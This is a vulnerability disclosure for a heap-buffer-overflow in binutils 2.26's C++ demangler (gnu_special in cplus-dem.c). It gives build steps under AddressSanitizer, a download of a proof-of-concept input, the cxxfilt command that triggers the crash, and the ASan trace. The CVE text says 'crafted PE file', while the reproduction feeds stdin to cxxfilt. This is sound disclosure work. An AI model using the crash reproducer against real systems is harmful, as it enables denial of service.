Use CVE-2025-66862 for:

** RESERVED ** A buffer overflow vulnerability in function gnu_special in file cplus-dem.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

# heap-buffer-overflow /binutils-2.26/libiberty/./cplus-dem.c:2954:10 in gnu_special

## Environment
docker image:silkeh/clang:12(Debian GNU/Linux 11 64 bit, clang 12.0.1)
binutils 2.26

## Steps to reproduce
1. start docker container
```
docker run -it --rm silkeh/clang:12 bash
```
2. download file
```
wget http://ftp.gnu.org/gnu/binutils/binutils-2.26.tar.gz
tar -xzf binutils-2.26.tar.gz 
cd binutils-2.26
```
3. compile
```
export CC="clang"
export CFLAGS="-g -Wno-error -fsanitize=address"
# avoid memory leak warnings detected by the LeakSanitizer (LSan) tool.
export ASAN_OPTIONS=detect_leaks=0
./configure
make -j
```
4. download poc3: 
```
wget https://github.com/caozhzh/CRGF-Vul/raw/refs/heads/main/pocs/poc3
```
5. command for reproducing the error
```
cat poc3 | binutils/cxxfilt
```

## crash report
```
> cat poc3 | binutils/cxxfilt 
=================================================================
==27949==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000232 at pc 0x000000854076 bp 0x7ffe98f4ebb0 sp 0x7ffe98f4eba8
READ of size 1 at 0x602000000232 thread T0
    #0 0x854075 in gnu_special /binutils-2.26/libiberty/./cplus-dem.c:2954:10
    #1 0x853771 in internal_cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:1190:14
    #2 0x850c43 in cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:886:9
    #3 0x86075f in demangle_template_value_parm /binutils-2.26/libiberty/./cplus-dem.c:2059:12
    #4 0x85cd41 in demangle_template /binutils-2.26/libiberty/./cplus-dem.c:2242:14
    #5 0x859aa5 in demangle_signature /binutils-2.26/libiberty/./cplus-dem.c:1625:18
    #6 0x85387a in internal_cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:1203:14
    #7 0x850c43 in cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:886:9
    #8 0x4cc2f9 in demangle_it /binutils-2.26/binutils/cxxfilt.c:62:12
    #9 0x4cbf3c in main /binutils-2.26/binutils/cxxfilt.c:275:4
    #10 0x7f69e3fded79 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x23d79)
    #11 0x41f4e9 in _start (/binutils-2.26/binutils/cxxfilt+0x41f4e9)

0x602000000232 is located 0 bytes to the right of 2-byte region [0x602000000230,0x602000000232)
allocated by thread T0 here:
    #0 0x49a3ad in malloc (/binutils-2.26/binutils/cxxfilt+0x49a3ad)
    #1 0x8a1947 in xmalloc /binutils-2.26/libiberty/./xmalloc.c:147:12
    #2 0x86066a in demangle_template_value_parm /binutils-2.26/libiberty/./cplus-dem.c:2051:18
    #3 0x85cd41 in demangle_template /binutils-2.26/libiberty/./cplus-dem.c:2242:14
    #4 0x859aa5 in demangle_signature /binutils-2.26/libiberty/./cplus-dem.c:1625:18
    #5 0x85387a in internal_cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:1203:14
    #6 0x850c43 in cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:886:9
    #7 0x4cc2f9 in demangle_it /binutils-2.26/binutils/cxxfilt.c:62:12
    #8 0x4cbf3c in main /binutils-2.26/binutils/cxxfilt.c:275:4
    #9 0x7f69e3fded79 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x23d79)

SUMMARY: AddressSanitizer: heap-buffer-overflow /binutils-2.26/libiberty/./cplus-dem.c:2954:10 in gnu_special
Shadow bytes around the buggy address:
  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff8000: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fd
  0x0c047fff8010: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fd
  0x0c047fff8020: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa
  0x0c047fff8030: fa fa fd fd fa fa fd fa fa fa fd fd fa fa fd fd
=>0x0c047fff8040: fa fa fd fd fa fa[02]fa fa fa fa fa fa fa fa fa
  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==27949==ABORTING
```
